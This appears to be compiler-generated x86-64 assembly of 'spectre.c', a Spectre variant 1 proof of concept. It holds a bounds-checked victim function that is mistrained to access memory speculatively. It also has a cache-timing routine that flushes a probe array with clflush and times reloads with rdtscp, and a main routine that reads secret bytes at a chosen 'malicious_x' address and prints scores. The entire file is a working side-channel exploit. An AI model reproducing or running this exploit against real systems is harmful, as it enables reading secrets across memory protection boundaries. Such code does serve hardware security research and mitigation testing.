	.file	"spectre.c"
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.p2align 4
	.globl	leak_data
	.type	leak_data, @function
leak_data:
.LFB5690:
	.cfi_startproc
	
	movslq	array1_size(%rip), %rax
	addq	%rsi, %rdi
	cmpq	%rax, %rdi
	jnb	.L3
	leaq	array1(%rip), %rax
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rdi), %eax
	sall	$9, %eax
	cltq
	movzbl	(%rdx,%rax), %eax
	andb	%al, temp(%rip)
.L3:
	ret
	.cfi_endproc
.LFE5690:
	.size	leak_data, .-leak_data
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5691:
	.cfi_startproc
	
	movzbl	temp1(%rip), %esi
	jmp	leak_data
	.cfi_endproc
.LFE5691:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5692:
	.cfi_startproc
	
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	leaq	results.0(%rip), %r9
	movl	$128, %ecx
	movl	$999, %r11d
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	movl	$2863311531, %r13d
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	leaq	array1(%rip), %r12
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	leaq	array2(%rip), %rbp
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	leaq	131072(%rbp), %rbx
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	movq	%rdi, 8(%rsp)
	movq	%r9, %rdi
	leaq	32(%rsp), %r10
	movq	%rsi, 16(%rsp)
	movq	%rdx, 24(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 40(%rsp)
	xorl	%eax, %eax
	movl	$0, 32(%rsp)
	rep stosq
.L7:
	leaq	array2(%rip), %rax
	.p2align 4,,10
	.p2align 3
.L8:
	clflush	(%rax)
	addq	$512, %rax
	cmpq	%rbx, %rax
	jne	.L8
	movl	%r11d, %eax
	movl	array1_size(%rip), %esi
	movq	8(%rsp), %r14
	movl	$29, %r8d
	cltd
	idivl	%esi
	movslq	%edx, %rcx
	xorq	%rcx, %r14
	.p2align 4,,10
	.p2align 3
.L10:
	clflush	array1_size(%rip)
	movl	$0, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jg	.L12
	.p2align 4,,10
	.p2align 3
.L9:
	movl	36(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jle	.L9
.L12:
	movl	%r8d, %eax
	xorl	%esi, %esi
	movb	$0, temp1(%rip)
	imulq	%r13, %rax
	shrq	$34, %rax
	leal	(%rax,%rax,2), %edx
	movl	%r8d, %eax
	addl	%edx, %edx
	subl	%edx, %eax
	subl	$1, %eax
	xorw	%ax, %ax
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r14, %rdi
	xorq	%rcx, %rdi
	call	leak_data
	subl	$1, %r8d
	jnb	.L10
	movl	$13, %esi
	.p2align 4,,10
	.p2align 3
.L11:
	movzbl	%sil, %r14d
	movl	%r14d, %r15d
	sall	$9, %r15d
	rdtscp
	movq	%rax, %rdi
	salq	$32, %rdx
	movslq	%r15d, %r15
	movl	%ecx, (%r10)
	orq	%rdx, %rdi
	movzbl	0(%rbp,%r15), %eax
	rdtscp
	salq	$32, %rdx
	movl	%ecx, (%r10)
	orq	%rdx, %rax
	subq	%rdi, %rax
	cmpq	$100, %rax
	ja	.L13
	movl	%r11d, %eax
	movl	array1_size(%rip), %ecx
	cltd
	idivl	%ecx
	movslq	%edx, %rdx
	movzbl	(%r12,%rdx), %eax
	cmpl	%r14d, %eax
	je	.L13
	addl	$1, (%r9,%r14,4)
.L13:
	addl	$167, %esi
	cmpl	$42765, %esi
	jne	.L11
	movl	$1, %eax
	xorl	%ecx, %ecx
	xorl	%edx, %edx
	jmp	.L14
	.p2align 4,,10
	.p2align 3
.L36:
	cmpl	$-1, %r8d
	je	.L21
	movslq	%r8d, %rdi
	cmpl	(%r9,%rdi,4), %esi
	cmovge	%eax, %r8d
.L15:
	addq	$1, %rax
.L14:
	movl	(%r9,%rdx,4), %edi
	cmpq	$256, %rax
	je	.L35
	movl	(%r9,%rax,4), %esi
	cmpl	%edi, %esi
	jl	.L36
	movslq	%eax, %rdx
	movl	%ecx, %r8d
	movq	%rdx, %rcx
	jmp	.L15
	.p2align 4,,10
	.p2align 3
.L21:
	movl	%eax, %r8d
	jmp	.L15
.L35:
	movslq	%r8d, %rsi
	movl	(%r9,%rsi,4), %eax
	leal	4(%rax,%rax), %r14d
	cmpl	%edi, %r14d
	jl	.L17
	cmpl	$2, %edi
	jne	.L22
	testl	%eax, %eax
	je	.L17
.L22:
	subl	$1, %r11d
	jne	.L7
.L17:
	movq	16(%rsp), %rbx
	movl	results.0(%rip), %eax
	xorl	32(%rsp), %eax
	movl	%eax, results.0(%rip)
	movb	%cl, (%rbx)
	movq	24(%rsp), %rcx
	movl	(%r9,%rdx,4), %eax
	movl	%eax, (%rcx)
	movb	%r8b, 1(%rbx)
	movl	(%r9,%rsi,4), %eax
	movl	%eax, 4(%rcx)
	movq	40(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L37
	addq	$56, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L37:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5693:
	.cfi_startproc
	
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$72, %rsp
	.cfi_def_cfa_offset 128
	movl	%edi, 4(%rsp)
	movq	%rsi, 8(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 56(%rsp)
	xorl	%eax, %eax
	movb	$5, temp1(%rip)
.L39:
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	je	.L57
.L40:
	cmpb	$10, %al
	je	.L39
	cmpb	$105, %al
	jne	.L49
	xorl	%eax, %eax
	call	getpid@PLT
	movl	$1, %edi
	leaq	33+check(%rip), %rdx
	leaq	.LC12(%rip), %rsi
	movl	%eax, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	jne	.L40
.L57:
	movq	secret(%rip), %rdx
	leaq	.LC2(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	leaq	array1(%rip), %rbx
	movq	%rdx, %rcx
	call	__printf_chk@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	subq	%rbx, %rax
	movq	%rax, 32(%rsp)
	call	strlen@PLT
	movl	$131072, %edx
	movl	$1, %esi
	leaq	array2(%rip), %rdi
	movl	%eax, 28(%rsp)
	movl	%eax, %r12d
	call	memset@PLT
	cmpl	$3, 4(%rsp)
	je	.L58
.L41:
	xorl	%eax, %eax
	movl	%r12d, %edx
	movl	$1, %edi
	leaq	.LC6(%rip), %rsi
	call	__printf_chk@PLT
	subl	$1, 28(%rsp)
	js	.L39
	xorl	%ebx, %ebx
	leaq	44(%rsp), %r14
	leaq	.LC7(%rip), %r15
	leaq	54(%rsp), %r13
	leaq	.LC8(%rip), %r12
	.p2align 4,,10
	.p2align 3
.L42:
	movq	secret(%rip), %rax
	movq	32(%rsp), %rdx
	movq	%r15, %rsi
	movl	$1, %edi
	movsbl	(%rax,%rbx), %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movq	32(%rsp), %rdi
	movq	%r14, %rdx
	movq	%r13, %rsi
	leaq	1(%rdi), %rax
	movq	%rax, 32(%rsp)
	call	readMemoryByte
	movl	48(%rsp), %ebp
	movl	44(%rsp), %r8d
	movq	%r12, %rsi
	leaq	.LC1(%rip), %rdx
	movl	$1, %edi
	leal	(%rbp,%rbp), %eax
	movl	%r8d, (%rsp)
	cmpl	%eax, %r8d
	leaq	.LC0(%rip), %rax
	cmovge	%rax, %rdx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	movzbl	54(%rsp), %edx
	movl	(%rsp), %r8d
	movl	$63, %ecx
	leaq	.LC9(%rip), %rsi
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
	testl	%ebp, %ebp
	jle	.L46
	movzbl	55(%rsp), %edx
	movl	$63, %ecx
	movl	%ebp, %r8d
	leaq	.LC10(%rip), %rsi
	movl	$1, %edi
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	cmovb	%edx, %ecx
	xorl	%eax, %eax
	call	__printf_chk@PLT
.L46:
	leaq	.LC11(%rip), %rsi
	movl	$1, %edi
	xorl	%eax, %eax
	addq	$1, %rbx
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	testl	%eax, %eax
	jns	.L42
	jmp	.L39
.L49:
	movq	56(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L59
	addq	$72, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	xorl	%eax, %eax
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L58:
	.cfi_restore_state
	movq	8(%rsp), %r15
	leaq	32(%rsp), %rdx
	leaq	.LC3(%rip), %rsi
	xorl	%eax, %eax
	movq	8(%r15), %rdi
	call	__isoc99_sscanf@PLT
	movq	16(%r15), %rdi
	leaq	28(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC4(%rip), %rsi
	subq	%rbx, 32(%rsp)
	call	__isoc99_sscanf@PLT
	movl	28(%rsp), %ecx
	movq	32(%rsp), %rdx
	xorl	%eax, %eax
	leaq	.LC5(%rip), %rsi
	movl	$1, %edi
	call	__printf_chk@PLT
	movl	28(%rsp), %r12d
	jmp	.L41
.L59:
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5693:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32

	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
